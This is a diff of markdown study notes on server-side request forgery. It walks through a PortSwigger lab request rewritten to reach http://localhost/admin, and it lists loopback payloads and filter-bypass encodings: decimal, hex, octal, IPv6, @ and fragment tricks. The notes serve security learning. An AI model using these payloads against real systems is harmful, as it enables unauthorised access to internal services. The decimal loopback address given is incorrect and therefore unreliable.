@@ -2,15 +2,15 @@
 
 # Overview
 
-
-## Anatomy Of A Modern Web Application
+## Anatomy Of A Web Application
 
 ![SSRF Diagram](./images/SSRF_Diagram.png)
 
 ## SSRF Conceputally
 
 + A SSRF exploit abuses the nature of web application systems, like most sytems, to be hardened to external traffic but relatively unprotected internally
-+ Exploiting a SSRF vulnerability allows an attacker to leverage the trusted nature of the internally facing web application against itself in order to retrive and access resources which ordinarly they could not reach without privillaged authentication or internal network access
++ Exploiting a SSRF vulnerability allows an attacker to leverage the trusted nature of the internally facing web application against itself in order to retrive and access resources on their behalf, which ordinarly they could not reach without privillaged authentication or internal network access
++ Additionally it may be possible to utlise the web application to move laterally through the internal network to other infrastructure resulting in potential RCE
 
 ## Sources Of SSRF Vulnrabilities
 
@@ -20,20 +20,129 @@
 	+ The web application has a open redirect vulnrability
 	+ The web application has a XXE vulnrability 
 
+# Tooling
+
++ [SSRFmap](https://github.com/swisskyrepo/SSRFmap)
+
 # SSRF Vectors
 
 ## SSRF Against the Host
 
++ Ultimately all web applications run on some kind of hardware at their core
++ From here layers of software build up to the web application that users interact with
++ However those lower layers do not always drop away from the user access level meaning that software running at a lower level can still be interacted with through the web application
++ It is this risidual or unintended exposure of vestigial software layers which lead to host based SSRF vulnerabilities
+
+### Layers of a modern Web Application
+
+![SSRF Against The Host Diagram](./images/WebApp_Host_Diagram.png)
+
+### Approach
+
++ To perform this kind of SSRF attack and attacker attempts to have the host fetch resources on their behalf exploiting the fact that the host is inherently trusted as a 'privilaged actor'
++ For example if an attacker where to attempt to access a admin page through the front end web application in a standard fashion without authenticating the web application returns an admin login panel
++ However if an attacker can induce the web applications host itself to access the admin page the attacker will be presented with the admin dashboard
+
+### Finding Host Based SSRF Vectors
+
++ Whenever a web application makes a request to itslef using a full URL path it may be possible to replay a modified version of the request to get an SSRF exploit
+
+```
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1 
+```  
+~Request From Portswigger Lab~
+
++ Attacker replaces the `stockApi` parameter in the request body with `localhost` to access the admin page via the hosts perspective
+
+```
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://localhost/admin 
+```  
+
++ Additionally host based SSRF may be found anywhere fully qualified  URLs are used to access or include resources
+	+ Profile images via URLs
+	+ Embeded content via URLs
+
+### General Payloads
+
+`http://localhost/resource_from_host_perspective`
+
+`http://127.0.0.1/resource_from_host_perspective`
+
+`http://127.1/resource_from_host_perspective`
+
 ## SSRF Against Internal Systems
 
-## SSRF Via Referer Header
++ SSRF attacks against other hosts on the internal network exploit the trusted relationship between systems in a private network
++ In a SSRF against other internal systems an attacker attempts to access another host on the internal network as the web servers host machine
 
-## Blind SSRF
+### Approach
+
++ An attacker attempts to learn the internal network topology of a web applications backend
++ This may be done through a vulnrability chain which allows for internal network scanning like a XSS vulnrability or command injection
++ Or via enumerating the subnet range of the internal network
++ If an attacker recives a response on a particular IP they have likely discovered a internal host at that location
+
+### Finding Internal Systems SSRF
+
++ Similarly to host based SSRF an attacker looks for places within the web application where fully qualified urls are used to access and fetch resources
++ An attacker then replaces these requests with the private IP address of a known, guessed or enumerated host on the internal network
++ Since the internal host may not return a response that the web server understands in a way that allows it to display a meaningful response this kind of SSRF may be blind
 
 # SSRF WAF && Filter Bypasses
 
++ If the web application attempts to prevent SSRF vectors via filtering or WAF rules it may be possible to circumvent these defenses using one or a combination of the work arounds bellow
+
 ## Blacklists
 
++ Where the web application runs requests against a list of ban strings or regex patterns
+	+ `localhost`
+	+ `127.`
+	+ `::`
+
+### DNS Resolution to localhost
+
+`http://localtest.me/`
+
+### Decimal
+
+`http://21307064433/`
+
+### Hexadecimal
+
+`http://0x7f000001/`
+
+### Octal
+
+`http://0177.0.0.01/`
+
+### All IPs
+
+`http://0.0.0.0/`
+
+### IPv6
+
+`http://0:0:0:0:0:0:0:1`
+
 ## Whitelists
+
++ Where the web application only allows URLs which match a list of strings or regex patterns
+	+ `https://the.domain.com`
+	+ `https://125.63`
+
+### @ Bypass
+
+`https://expected-host@localhost/`
+
+### URL Fragment
+
+`https://localhost#expected-host`
 
 ## Open Redirects
